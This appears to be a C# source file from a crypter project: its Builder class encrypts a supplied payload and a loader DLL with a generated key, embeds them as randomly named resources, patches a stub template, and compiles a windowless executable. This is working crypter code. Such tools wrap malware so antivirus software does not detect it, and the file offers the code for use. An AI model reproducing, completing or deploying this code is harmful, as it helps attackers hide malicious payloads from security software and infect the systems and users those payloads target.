using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Resources;

namespace Crypt
{
    class Builder
    {
        private Byte[] _payload;
        private Options _options;
        private string _loaderPath;

        public Builder(byte[] payload, Options options)
        {
            _payload = payload;
            _options = options;

            //Super hacky
            //TODO: Find better way to access Loader.dll
#if DEBUG
            _loaderPath = @"..\..\..\Loader\bin\Debug\Loader.dll";
#else
            _loaderPath = @"..\..\..\Loader\bin\Release\Loader.dll";
#endif

            PopulateGeneratedOptions();
        }

        public bool Build()
        {
            byte[] loaderBinary = File.ReadAllBytes(_loaderPath);
            byte[] encPayload = Encryption.Encrypt(_options.encryptionType, _options.encryptionKey, _payload);
            byte[] encLoader = Encryption.Encrypt(_options.encryptionType, _options.encryptionKey, loaderBinary);

            string stubSrc = AddOptionsToStub(Properties.Resources.Stub);

            string resourceDir = CreateResource(encPayload, encLoader);
            CompilerParameters compParams = GenerateCompilerParams(resourceDir);

            bool result = Compile(stubSrc, compParams);

            File.Delete(resourceDir);

            return result;
        }

        private void PopulateGeneratedOptions()
        {
            _options.encryptionKey = Encryption.GenerateKey();
            _options.resFileName = Guid.NewGuid().ToString().Substring(0, 5);
            _options.resPayloadName = Guid.NewGuid().ToString().Substring(0, 5);
            _options.resLoaderName = Guid.NewGuid().ToString().Substring(0, 5);
        }

        private string AddOptionsToStub(string stubSrc)
        {
            string newStub = stubSrc.Replace("[encryptionKey]", Convert.ToBase64String(_options.encryptionKey));
            newStub = newStub.Replace("[resFileName]", _options.resFileName);
            newStub = newStub.Replace("[resPayloadName]", _options.resPayloadName);
            newStub = newStub.Replace("[resLoaderName]", _options.resLoaderName);
            newStub = newStub.Replace("[hostDir]", _options.hostDir);

            return newStub;
        }

        private string CreateResource(byte[] encPayload, byte[] encLoader)
        {
            string resourceDir = _options.resFileName + ".resources";
            using (ResourceWriter resourceWriter = new ResourceWriter(resourceDir))
            {
                resourceWriter.AddResource(_options.resPayloadName, encPayload);
                resourceWriter.AddResource(_options.resLoaderName, encLoader);
                resourceWriter.Generate();
            }
            return resourceDir;
        }

        private CompilerParameters GenerateCompilerParams(string resourceDir)
        {
            CompilerParameters compParams = new CompilerParameters();
            compParams.GenerateExecutable = true;
            compParams.TreatWarningsAsErrors = false;
            compParams.OutputAssembly = _options.buildDir;
            compParams.CompilerOptions = "/optimize+ /platform:x86 /target:winexe /unsafe";

            compParams.ReferencedAssemblies.Add("System.dll");
            compParams.EmbeddedResources.Add(resourceDir);

            return compParams;
        }

        private bool Compile(string stubSrc, CompilerParameters compParams)
        {
            Dictionary<string, string> providerOptions = new Dictionary<string, string>();
            providerOptions.Add("CompilerVersion", "v2.0");

            CompilerResults compResults = new CSharpCodeProvider(providerOptions).CompileAssemblyFromSource(compParams, stubSrc);

            return !compResults.Errors.HasErrors;
        }
    }
}
